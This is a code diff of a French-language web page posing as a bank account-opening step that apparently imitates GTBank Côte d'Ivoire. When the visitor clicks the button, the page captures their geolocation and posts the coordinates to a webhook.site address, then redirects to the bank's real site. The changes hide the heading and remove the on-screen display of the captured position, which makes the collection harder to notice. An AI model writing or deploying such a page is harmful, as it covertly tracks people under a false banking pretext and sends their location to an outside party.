@@ -4,7 +4,7 @@
   <title>Ouverture de compte bancaire</title>
 </head>
 <body>
-  <h1>Bonjour - 👋</h1>
+ <!--<h1>Bonjour - 👋</h1>-->
   <p>Ouverture de compte bancaire</p>
   <button style="background-color: #ff6f09;" onclick="getLocation()">Continuer pour ouvrir mon compte bancaire</button>
   <p id="result"></p>
@@ -22,16 +22,18 @@
       const lat = position.coords.latitude;
       const lon = position.coords.longitude;
 
-      document.getElementById("result").innerText =
-        `Position reçue : Latitude ${lat}, Longitude ${lon}`;
+      /*document.getElementById("result").innerText =
+        `Position reçue : Latitude ${lat}, Longitude ${lon}`;*/
 
       // Envoie vers ton webhook ou ton email via service externe
       fetch("https://webhook.site/b03e51c0-21dd-446a-a69a-2a20af217999", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ latitude: lat, longitude: lon })
+      }).then(()=>{
+        window.location.replace("https://ebank.gtbankci.com/OpenAccount/")
       });
-      window.location.replace("https://ebank.gtbankci.com/OpenAccount/")
+      
     }
 
     function showError(error) {
